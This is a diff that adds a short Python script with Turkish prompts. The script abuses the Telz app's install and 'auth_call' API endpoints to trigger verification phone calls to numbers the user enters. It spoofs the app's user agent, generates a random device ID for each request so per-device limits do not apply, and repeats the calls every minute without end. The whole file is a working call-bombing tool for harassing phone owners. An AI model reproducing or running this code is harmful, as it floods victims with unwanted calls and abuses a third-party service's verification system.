@@ -1,0 +1,84 @@
+import time
+import random
+import string
+import uuid
+import json
+import requests
+from requests.exceptions import RequestException
+
+def generate_device_id():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+
+def get_timestamp():
+    return round(time.time() * 1000)
+
+def create_install_payload(device_id, uuid, ts):
+    return json.dumps({
+        'androidid': device_id,
+        'app_version': '17.5.17',
+        'event': 'install',
+        'google_exists': 'yes',
+        'os': 'android',
+        'os_version': '9',
+        'play_market': True,
+        'ts': ts,
+        'uuid': uuid
+    })
+
+def create_authcall_payload(device_id, uuid, ts, phone):
+    return json.dumps({
+        'androidid': device_id,
+        'app_version': '17.5.17',
+        'attempt': '0',
+        'event': 'auth_call',
+        'lang': 'ar',
+        'os': 'android',
+        'os_version': '9',
+        'phone': f'+{phone}',
+        'ts': ts,
+        'uuid': uuid
+    })
+
+def send_request(url, payload, headers):
+    try:
+        return requests.post(url, data=payload, headers=headers, timeout=10)
+    except RequestException as e:
+        raise RequestException(str(e))
+
+def Quantex_python():
+    headers = {"User-Agent": "Telz-Android/17.5.17", "Content-Type": "application/json"}
+    phone_numbers = [
+        n.strip().replace("+", "") for n in input("Numara Gir: ").split(",")
+        if n.strip().replace("+", "").isdigit()
+    ]
+
+    if not phone_numbers:
+        print("GECERSİZ NUMARA YARRAM")
+        return
+
+    while True:
+        for num in phone_numbers:
+            ts = get_timestamp()
+            device_id = generate_device_id()
+            uid = str(uuid.uuid4())
+
+            try:
+                install_payload = create_install_payload(device_id, uid, ts)
+                if send_request('https://api.telz.com/app/install', install_payload, headers).ok:
+                    authcall_payload = create_authcall_payload(device_id, uid, ts, num)
+                    if send_request('https://api.telz.com/app/authcall', authcall_payload, headers).ok:
+                        print(f"+{num} Arama Gonderildi")
+                    else:
+                        print(f"+{num} arama gitmedi")
+                else:
+                    print(f"+{num} Install hatali")
+            except RequestException as e:
+                print(f"+{num} Hata: {e}")
+
+        time.sleep(60)
+
+if __name__ == "__main__":
+    try:
+        Quantex_python()
+    except KeyboardInterrupt:
+        print("Durduruldu.")
